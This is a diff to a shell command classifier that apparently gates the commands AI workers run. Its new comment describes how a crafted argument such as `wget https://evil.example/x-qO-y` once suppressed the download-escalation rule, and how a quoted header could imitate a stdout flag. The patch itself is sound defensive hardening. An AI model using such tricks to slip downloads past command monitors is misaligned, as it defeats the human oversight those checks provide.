@@ -591,8 +591,25 @@ classify_command() {
        # keeps fd duplication out: without it, every `curl … 2>&1 | head`
        # in the corpus read as a download landing a file named `&1`.
        _cp_match '>[[:space:]]*[^&[:space:]]' "$_cp_fields" ||
-       { _cp_imatch '(^|[^A-Za-z0-9_.-])([^[:space:]]*/)?(wget|fetch|aria2c)([[:space:]]|$)' "$_cp_fields" &&
-         ! _cp_match '(-O[[:space:]]*-|--output-document=-|-qO-)' "$_cp_fields"; }; then
+       # wget/fetch/aria2c save a file unless told otherwise, so their mere
+       # presence is a landing. There used to be a NEGATIVE test here —
+       # "unless the field asks for stdout" — and it was the only negative
+       # test in the consequence rules, which made it the one place extra text
+       # could CANCEL an escalation instead of adding one. Unanchored, the
+       # attacker chose that text (`wget https://evil.example/x-qO-y` suppressed
+       # the rule while wget saved the body to ./x-qO-y, pass 4). Anchoring it
+       # to an argument boundary was not enough either: after quote-stripping,
+       # `--header='X-A: -qO-'` is indistinguishable from a real argument.
+       #
+       # So it is gone. Requesting stdout is now recognised only POSITIVELY,
+       # by the extracted output target being `-` (or /dev/null) below, which
+       # no amount of added text can fake. `wget -O -` and
+       # `--output-document=-` still pass that way; the attached `-qO-` form
+       # escalates, and that costs nothing measurable — across 1,703 distinct
+       # commands real workers ran, `wget` appears ZERO times and every
+       # `fetch` hit is `git fetch`. A shape that has never occurred is not
+       # worth the only fail-open-shaped test in the file.
+       _cp_imatch '(^|[^A-Za-z0-9_.-])([^[:space:]]*/)?(wget|fetch|aria2c)([[:space:]]|$)' "$_cp_fields"; then
       _cp_outs="$(printf '%s' "$_cp_fields" | grep -oiE '((^|[[:space:]])-[A-Za-z]*[oO]([[:space:]]+|[^-[:space:]])|--output[[:space:]=]+|--output-document[[:space:]=]+|>[[:space:]]*[^&[:space:]])[^[:space:]]*' |
                   sed -E 's/^.*(-[A-Za-z]*[oO][[:space:]]+|--output[[:space:]=]+|--output-document[[:space:]=]+|>[[:space:]]*)//; s/^[[:space:]]*-[A-Za-z]*[oO]//')"
       # The loopback exemption belongs to the REQUEST URL, not to anything
